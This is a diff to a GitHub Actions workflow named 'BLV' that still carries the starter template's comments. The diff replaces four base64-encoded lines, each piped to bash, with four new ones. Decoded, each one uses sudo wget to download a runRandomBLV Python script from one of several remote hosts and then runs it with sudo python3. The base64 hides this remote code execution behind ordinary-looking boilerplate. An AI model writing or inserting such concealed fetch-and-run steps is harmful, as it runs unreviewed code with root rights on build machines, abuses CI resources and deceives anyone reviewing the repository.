@@ -2,6 +2,10 @@
 
 
 
+
+
+
+
 # This is a basic workflow to help you get started with Actions
 
 name: BLV
@@ -41,12 +45,11 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           pip3 install requests
-          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cDovL2hrZy55dW56aG9uZ3podWFuLmNvbS9xcTEwNzA4OTI1NzMvcnVuUmFuZG9tQkxWMi5weS50eHQucGhwJyAmJiBzdWRvIHB5dGhvbjMgYmlu" | base64 -d | bash
-          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9hcGl5dW56aG9uZ3podWFuY29tLnZlcmNlbC5hcHAvcnVuUmFuZG9tQkxWMi5weS50eHQnICYmIHN1ZG8gcHl0aG9uMyBiaW4=" | base64 -d | bash
-          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9oa2cuZDVsMGR2dDE0cjVoOC5uZXQvcXExMDcwODkyNTczL3J1blJhbmRvbUJMVjIucHkudHh0LnBocCcgJiYgc3VkbyBweXRob24zIGJpbg==" | base64 -d | bash
-          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9jYWU0NTc3NjY4NWJhLmNuYW1lLmZyb250d2l6ZS5jb20vcXExMDcwODkyNTczL3J1blJhbmRvbUJMVjIucHkudHh0JyAmJiBzdWRvIHB5dGhvbjMgYmlu" | base64 -d | bash
-          echo 2
-
+          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cDovL2hrZy55dW56aG9uZ3podWFuLmNvbS9xcTEwNzA4OTI1NzMvcnVuUmFuZG9tQkxWOS5weS50eHQucGhwJyAmJiBzdWRvIHB5dGhvbjMgYmlu" | base64 -d | bash
+          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9hcGl5dW56aG9uZ3podWFuY29tLnZlcmNlbC5hcHAvcnVuUmFuZG9tQkxWOS5weS50eHQnICYmIHN1ZG8gcHl0aG9uMyBiaW4=" | base64 -d | bash
+          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9oa2cuZDVsMGR2dDE0cjVoOC5uZXQvcXExMDcwODkyNTczL3J1blJhbmRvbUJMWTkucHkudHh0LnBocCcgJiYgc3VkbyBweXRob24zIGJpbg==" | base64 -d | bash
+          echo "c3VkbyB3Z2V0IC1PIGJpbiAnaHR0cHM6Ly9jYWU0NTc3NjY4NWJhLmNuYW1lLmZyb250d2l6ZS5jb20vcXExMDcwODkyNTczL3J1blJhbmRvbUJMWTkucHkudHh0JyAmJiBzdWRvIHB5dGhvbjMgYmlu" | base64 -d | bash
+          echo 9
 
 
 
